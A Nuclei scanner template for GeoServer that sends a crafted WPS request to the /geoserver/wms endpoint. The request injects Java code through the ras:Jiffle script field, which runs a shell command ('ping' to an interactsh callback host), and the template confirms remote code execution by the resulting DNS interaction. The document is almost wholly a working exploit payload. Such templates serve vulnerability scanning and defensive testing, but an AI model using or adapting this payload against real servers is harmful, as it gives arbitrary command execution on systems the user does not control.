id: geoserver-vms-rce

info:
  name: geoserver-vms-rce
  author: geoserver-vms-rce

http:
  - raw:
      - |
        POST /geoserver/wms HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36
        Connection: close
        Content-Length: 1792
        Content-Type: application/xml
        Accept-Encoding: gzip
        SL-CE-SUID: 3
        
        <?xml version="1.0" encoding="UTF-8"?>
        <wps:Execute version="1.0.0" service="WPS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://www.opengis.net/wps/1.0.0" xmlns:wfs="http://www.opengis.net/wfs" xmlns:wps="http://www.opengis.net/wps/1.0.0" xmlns:ows="http://www.opengis.net/ows/1.1" xmlns:gml="http://www.opengis.net/gml" xmlns:ogc="http://www.opengis.net/ogc" xmlns:wcs="http://www.opengis.net/wcs/1.1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xsi:schemaLocation="http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd">
        	<ows:Identifier>ras:Jiffle</ows:Identifier>
        	<wps:DataInputs>
        		<wps:Input>
        			<ows:Identifier>coverage</ows:Identifier>
        			<wps:Data>
        				<wps:ComplexData mimeType="application/arcgrid">
        					<![CDATA[ncols 720 nrows 360 xllcorner -180 yllcorner -90 cellsize 0.5 NODATA_value -9999 316]]>
        				</wps:ComplexData>
        			</wps:Data>
        		</wps:Input>
        		<wps:Input>
        			<ows:Identifier>script</ows:Identifier>
        			<wps:Data>
        				<wps:LiteralData>dest = y() - (500); // */ public class Double { public static double NaN = 0; static { try { java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("ping -nc 2 {{interactsh-url}}").getInputStream())); String line = null; String allLines = " - "; while ((line = reader.readLine()) != null) { allLines += line; } throw new RuntimeException(allLines);} catch (java.io.IOException e) {} }} /**</wps:LiteralData>
        			</wps:Data>
        		</wps:Input>
        		<wps:Input>
        			<ows:Identifier>outputType</ows:Identifier>
        			<wps:Data>
        				<wps:LiteralData>DOUBLE</wps:LiteralData>
        			</wps:Data>
        		</wps:Input>
        	</wps:DataInputs>
        	<wps:ResponseForm>
        		<wps:RawDataOutput mimeType="image/tiff">
        			<ows:Identifier>result</ows:Identifier>
        		</wps:RawDataOutput>
        	</wps:ResponseForm>
        </wps:Execute>
        
        


    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"